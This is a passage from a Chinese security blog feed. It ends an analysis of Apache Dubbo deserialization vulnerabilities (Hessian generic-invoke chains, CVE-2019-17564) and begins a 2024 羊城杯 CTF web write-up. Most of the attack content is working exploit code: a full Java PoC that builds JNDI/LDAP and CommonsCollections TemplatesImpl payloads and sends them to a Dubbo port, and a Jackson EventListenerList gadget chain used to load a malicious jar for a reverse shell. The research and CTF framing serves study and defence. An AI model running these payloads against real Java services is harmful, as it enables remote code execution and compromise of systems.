alt="image-20240908001352732"></p><p>相当于执行了<code>UnsafeByteArrayInputStream#readObject</code>方法造成了反序列化</p><p>调用栈为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">readObject:<span class="hljs-number">371</span>, ObjectInputStream (java.io)<br>readObject:<span class="hljs-number">50</span>, NativeJavaObjectInput (org.apache.dubbo.common.serialize.nativejava)<br>invoke:<span class="hljs-number">98</span>, GenericFilter (org.apache.dubbo.rpc.filter)<br>invoke:<span class="hljs-number">83</span>, ProtocolFilterWrapper$<span class="hljs-number">1</span> (org.apache.dubbo.rpc.protocol)<br>invoke:<span class="hljs-number">38</span>, ClassLoaderFilter (org.apache.dubbo.rpc.filter)<br>invoke:<span class="hljs-number">83</span>, ProtocolFilterWrapper$<span class="hljs-number">1</span> (org.apache.dubbo.rpc.protocol)<br>invoke:<span class="hljs-number">41</span>, EchoFilter (org.apache.dubbo.rpc.filter)<br>invoke:<span class="hljs-number">83</span>, ProtocolFilterWrapper$<span class="hljs-number">1</span> (org.apache.dubbo.rpc.protocol)<br>reply:<span class="hljs-number">145</span>, DubboProtocol$<span class="hljs-number">1</span> (org.apache.dubbo.rpc.protocol.dubbo)<br>received:<span class="hljs-number">152</span>, DubboProtocol$<span class="hljs-number">1</span> (org.apache.dubbo.rpc.protocol.dubbo)<br>received:<span class="hljs-number">177</span>, HeaderExchangeHandler (org.apache.dubbo.remoting.exchange.support.header)<br></code></pre></td></tr></table></figure><h5 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br><br>        <span class="hljs-comment">// header.</span><br>        <span class="hljs-type">byte</span>[] header = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">16</span>];<br>        <span class="hljs-comment">// set magic number.</span><br>        Bytes.short2bytes((<span class="hljs-type">short</span>) <span class="hljs-number">0xdabb</span>, header);<br>        <span class="hljs-comment">// set request and serialization flag.</span><br>        header[<span class="hljs-number">2</span>] = (<span class="hljs-type">byte</span>) ((<span class="hljs-type">byte</span>) <span class="hljs-number">0x80</span> | <span class="hljs-number">2</span>);<br><br>        <span class="hljs-comment">// set request id.</span><br>        Bytes.long2bytes(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>().nextInt(<span class="hljs-number">100000000</span>), header, <span class="hljs-number">4</span>);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">hessian2ByteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">Hessian2ObjectOutput</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2ObjectOutput</span>(hessian2ByteArrayOutputStream);<br><br>        <span class="hljs-comment">// set body</span><br>        out.writeUTF(<span class="hljs-string">&quot;2.7.9&quot;</span>);<br>        <span class="hljs-comment">// todo 此处填写Dubbo提供的服务名</span><br>        out.writeUTF(<span class="hljs-string">&quot;org.apache.dubbo.spring.boot.demo.consumer.DemoService&quot;</span>);<br>        out.writeUTF(<span class="hljs-string">&quot;&quot;</span>);<br>        out.writeUTF(<span class="hljs-string">&quot;$invoke&quot;</span>);<br>        out.writeUTF(<span class="hljs-string">&quot;Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;&quot;</span>);<br>        <span class="hljs-comment">// todo 此处填写Dubbo提供的服务的方法</span><br>        out.writeUTF(<span class="hljs-string">&quot;sayHello&quot;</span>);<br>        out.writeObject(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123;<span class="hljs-string">&quot;java.lang.String&quot;</span>&#125;);<br><br>        <span class="hljs-comment">// POC 1: raw.return</span><br><span class="hljs-comment">//        getRawReturnPayload(out, &quot;ldap://127.0.0.1:8087/Exploit&quot;);</span><br><br>        <span class="hljs-comment">// POC 2: bean</span><br>        getBeanPayload(out, <span class="hljs-string">&quot;ldap://127.0.0.1:1389/xitdbc&quot;</span>);<br><br>        <span class="hljs-comment">// POC 3: nativejava</span><br><span class="hljs-comment">//        getNativeJavaPayload(out, &quot;src\\main\\java\\top\\lz2y\\1.ser&quot;);</span><br><br>        out.flushBuffer();<br><br>        Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, <span class="hljs-number">12</span>);<br>        byteArrayOutputStream.write(header);<br>        byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());<br><br>        <span class="hljs-type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();<br><br>        <span class="hljs-comment">//todo 此处填写Dubbo服务地址及端口</span><br>        <span class="hljs-type">Socket</span> <span class="hljs-variable">socket</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Socket</span>(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">9999</span>);<br>        <span class="hljs-type">OutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> socket.getOutputStream();<br>        outputStream.write(bytes);<br>        outputStream.flush();<br>        outputStream.close();<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getRawReturnPayload</span><span class="hljs-params">(Hessian2ObjectOutput out, String ldapUri)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">jndi</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        jndi.put(<span class="hljs-string">&quot;class&quot;</span>, <span class="hljs-string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span>);<br>        jndi.put(<span class="hljs-string">&quot;asText&quot;</span>, ldapUri);<br>        out.writeObject(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;jndi&#125;);<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map.put(<span class="hljs-string">&quot;generic&quot;</span>, <span class="hljs-string">&quot;raw.return&quot;</span>);<br>        out.writeObject(map);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getBeanPayload</span><span class="hljs-params">(Hessian2ObjectOutput out, String ldapUri)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">JavaBeanDescriptor</span> <span class="hljs-variable">javaBeanDescriptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JavaBeanDescriptor</span>(<span class="hljs-string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span>,<span class="hljs-number">7</span>);<br>        javaBeanDescriptor.setProperty(<span class="hljs-string">&quot;asText&quot;</span>,ldapUri);<br>        out.writeObject(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;javaBeanDescriptor&#125;);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><br>        map.put(<span class="hljs-string">&quot;generic&quot;</span>, <span class="hljs-string">&quot;bean&quot;</span>);<br>        out.writeObject(map);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getNativeJavaPayload</span><span class="hljs-params">(Hessian2ObjectOutput out, String serPath)</span> <span class="hljs-keyword">throws</span> Exception, NotFoundException &#123;<br>        <span class="hljs-comment">//创建TemplatesImpl对象加载字节码</span><br>        <span class="hljs-type">byte</span>[] code = ClassPool.getDefault().get(<span class="hljs-string">&quot;ysoserial.vulndemo.Calc&quot;</span>).toBytecode();<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;RoboTerh&quot;</span>);<br>        setFieldValue(obj,<span class="hljs-string">&quot;_class&quot;</span>,<span class="hljs-literal">null</span>);<br>        setFieldValue(obj,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        setFieldValue(obj,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br><br>        <span class="hljs-comment">//创建 ChainedTransformer实例</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;obj&#125;),<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        <span class="hljs-comment">//创建TranformingComparator 实例</span><br>        <span class="hljs-type">Comparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(chain);<br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>);<br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(priorityQueue, comparator);<br><br>        <span class="hljs-comment">//序列化</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baor);<br>        oos.writeObject(priorityQueue);<br>        oos.close();<br>        <span class="hljs-type">byte</span>[] payload = baor.toByteArray();<br><br>        out.writeObject(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;payload&#125;);<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map.put(<span class="hljs-string">&quot;generic&quot;</span>, <span class="hljs-string">&quot;nativejava&quot;</span>);<br>        out.writeObject(map);<br>    &#125;<br></code></pre></td></tr></table></figure><h5 id="patch-1"><a href="#patch-1" class="headerlink" title="patch"></a>patch</h5><p>在2.7.10版本使用了黑名单来阻断raw.return和bean这两条链</p><p>分别在<code>org\apache\dubbo\common\utils\PojoUtils.java#realize0</code> <code>org\apache\dubbo\common\beanutil\JavaBeanSerializeUtil.java#name2Class</code></p><p>而nativejava则通过判断配置文件是否允许nativejava的反序列化。</p><h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><p>除了hessian，还有个稍微有点远的http漏洞<code>CVE-2019-17564</code>。</p><h4 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h4><ul><li>2.7.0 &lt;&#x3D; Apache Dubbo &lt;&#x3D; 2.7.4</li><li>2.6.0 &lt;&#x3D; Apache Dubbo &lt;&#x3D; 2.6.7</li><li>Apache Dubbo &#x3D; 2.5.x</li></ul><p>这个CVE主要是因为在发送POST请求的时候将会将body中的数据进行反序列化处理造成了漏洞</p><p>我们可以在开启服务提供者了之后，在<code>org.apache.dubbo.remoting.http.servlet.DispatcherServlet#service</code>处打下断点，这个类主要是处理请求的分发的类，在接收到http请求之后会调用service方法</p><p>之后随便发送一个post请求。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -X POST -d <span class="hljs-string">&#x27;aa&#x27;</span> <span class="hljs-string">&#x27;http://192.168.56.1:8080/org.apache.dubbo.samples.http.api.DemoService&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/2024/09/02/Dubbo/image-20240908001650492.png" alt="image-20240908001650492"></p><p>成功拦截了这个handler,之后会调用handle方法：</p><p><img src="/2024/09/02/Dubbo/image-20240908001703249.png" alt="image-20240908001703249"></p><p>之后调用<code>request.getRequestURI</code>方法，获取path路径，之后会在之后查找uri路径是否在skeletonMap中：</p><p><img src="/2024/09/02/Dubbo/image-20240908001720829.png" alt="image-20240908001720829"></p><p>如果没有，之后将会返回错误，因为没有提供对应的服务。</p><p>之后就是获取远程地址和远程地址的端口，最后调用了<code>skeleton.handleRequest</code>方法</p><p>这个时候skeleton是<code>HttpInvokerServiceExporter</code>类，值得关注的他的contentType居然是<code>application/x-java-serialized-object</code>类型：</p><p><img src="/2024/09/02/Dubbo/image-20240908001740453.png" alt="image-20240908001740453"></p><p>来到handleRequest方法：</p><p><img src="/2024/09/02/Dubbo/image-20240908001807350.png" alt="image-20240908001807350"></p><p>跟进<code>readRemoteInvocation</code>方法调用：</p><p><img src="/2024/09/02/Dubbo/image-20240908001818635.png" alt="image-20240908001818635"></p><p>继续调用其方法重载（加上了个request作用域的输入流作为参数：</p><p><img src="/2024/09/02/Dubbo/image-20240908001830796.png" alt="image-20240908001830796"></p><p>在上面箭头位置，比如要在request域中获取inputstream，不然不会进入<code>doReadRemoteInvocation</code>方法的调用</p><p>我们跟进漏洞触发点方法<code>doReadRemoteInvocation</code>方法：</p><p><img src="/2024/09/02/Dubbo/image-20240908001849228.png" alt="image-20240908001849228"></p><p>在这里将ois这个ObejctInputStream对象直接没有过滤就进行了反序列化的调用，造成了反序列化漏洞。</p><p>若是有个CC3.2的依赖，直接可以打CC4了。</p><h4 id="patch-2"><a href="#patch-2" class="headerlink" title="patch"></a>patch</h4><p>在<code>2.7.5</code>版本中，在获取了skeleton之后调用其handle方法，此时的skeleton是<code>JsonRpcServer</code>对象：</p><p><img src="/2024/09/02/Dubbo/image-20240908001938135.png" alt="image-20240908001938135"></p><p>我们也可以知道其是调用的其父类的handler方法：</p><p><img src="/2024/09/02/Dubbo/image-20240908001949320.png" alt="image-20240908001949320"></p><p>在其中没有可反序列化的操作：</p><p><img src="/2024/09/02/Dubbo/image-20240908001959494.png" alt="image-20240908001959494"></p><p>当然还有 Redis &#x2F; Kryo等等协议造成的漏洞等。</p><p>Hessian协议还有CVE-2021-37579，也有toStringBean的漏洞CVE-2021-43297，详见<a href="https://mp.weixin.qq.com/s/WKeSRSEJ5hLAXzF60vau5g?ref=www.ctfiot.com">Dubbo反序列化漏洞分析集合2 (qq.com)</a></p><p>参考：</p><p><a href="https://tttang.com/archive/1730/#toc_cve-2021-30179">Dubbo反序列化漏洞分析集合1 - 跳跳糖 (tttang.com)</a></p><p><a href="https://p4d0rn.gitbook.io/java/serial-journey/dubbo#id-0x01-what-is-dubbo">Dubbo | Java (gitbook.io)</a></p><p><a href="https://l3yx.github.io/2020/08/25/Apache-Dubbo-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/#CVE-2019-17564">Apache Dubbo 反序列化漏洞复现笔记 | l3yx’s blog</a></p><p><a href="https://mp.weixin.qq.com/s/WKeSRSEJ5hLAXzF60vau5g?ref=www.ctfiot.com">Dubbo反序列化漏洞分析集合2 (qq.com)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024羊城杯-web</title>
    <link href="/2024/08/30/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF-web/"/>
    <url>/2024/08/30/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF-web/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>真是一场酣畅淋漓的赤石啊。</p><p>还有阴兵凌晨三点上分的，闲鱼py哥闹麻了。直接给我们从第一干到第十去了，笑吸了。</p><p>懒得说了，直接来吧。</p><h2 id="ezjava"><a href="#ezjava" class="headerlink" title="ezjava"></a>ezjava</h2><p>发现getGift这个getter方法可以直接写类加载器：</p><p><img src="/2024/08/30/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF-web/image-20240830213741544.png" alt="image-20240830213741544"></p><p>绕过file也很简单，前面加个<code>:file:/</code>就绕了。</p><p>文件上传接口上传一个包含恶意static代码块的jar包，然后用到一个从AliyunCTF2024里学到的比较新的Jackson原生：</p><p><code>EventListenerList#readObject -&gt; JacksonToString2Getter</code></p><p>进到user的getGift后，使用jar:加载恶意类jar:file:templates&#x2F;evil.jar!&#x2F;</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-comment">//import com.xiinnn.template.ToStringClass;</span><br><span class="hljs-comment">//import com.xiinnn.tostring2getter.JacksonToString2Getter;</span><br><span class="hljs-keyword">import</span> com.example.ycbjava.bean.User;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><br><span class="hljs-keyword">import</span> javax.swing.event.EventListenerList;<br><span class="hljs-keyword">import</span> javax.swing.undo.UndoManager;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.Vector;<br><span class="hljs-keyword">import</span> java.sql.Driver;<br><br><span class="hljs-comment">// EventListenerList#readObject -&gt; toString</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><span class="hljs-comment">//        ToStringClass toStringClass = new ToStringClass();</span><br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>        user.username=<span class="hljs-string">&quot;jar:file:templates/evil.jar!/eval&quot;</span>;<br><br>        <span class="hljs-comment">//if here you don&#x27;t use try-catch, the program will throw an exception and execute fail.</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">jsonNode</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> jsonNode.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>            jsonNode.removeMethod(writeReplace);<br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br>            jsonNode.toClass(classLoader, (ProtectionDomain)<span class="hljs-literal">null</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var11) &#123;<br>        &#125;;<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(user);<br><span class="hljs-comment">//        JacksonToString2Getter jackson = new JacksonToString2Getter();</span><br>        <span class="hljs-type">EventListenerList</span> <span class="hljs-variable">list</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventListenerList</span>();<br>        <span class="hljs-type">UndoManager</span> <span class="hljs-variable">manager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UndoManager</span>();<br>        <span class="hljs-type">Vector</span> <span class="hljs-variable">vector</span> <span class="hljs-operator">=</span> (Vector) getFieldValue(manager, <span class="hljs-string">&quot;edits&quot;</span>);<br>        vector.add(node);<br>        setFieldValue(list, <span class="hljs-string">&quot;listenerList&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;InternalError.class, manager&#125;);<br>        <span class="hljs-type">byte</span>[] code = serialize(list);<br>        System.out.println(Base64.getEncoder().encodeToString(code));<br><span class="hljs-comment">//        unserialize(code);</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getFieldValue</span><span class="hljs-params">(Object obj, String fieldName)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> obj.getClass();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                field = c.getDeclaredField(fieldName);<br>            &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e)&#123;<br>                c = c.getSuperclass();<br>            &#125;<br>        &#125;<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">return</span> field.get(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String field, Object val)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">dField</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(field);<br>        dField.setAccessible(<span class="hljs-literal">true</span>);<br>        dField.set(obj, val);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] serialize(Object obj) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(obj);<br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unserialize</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] code)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(code);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>文件上传处传入恶意jar，然后打&#x2F;user&#x2F;ser路由反序列化直接添加classloader，反弹shell交了。</p><h2 id="Lyrics-For-You"><a href="#Lyrics-For-You" class="headerlink" title="Lyrics For You"></a>Lyrics For You</h2><p>打烂的题。</p><p>pickle反序列化，手搓个opcode：</p><figure class="highlight 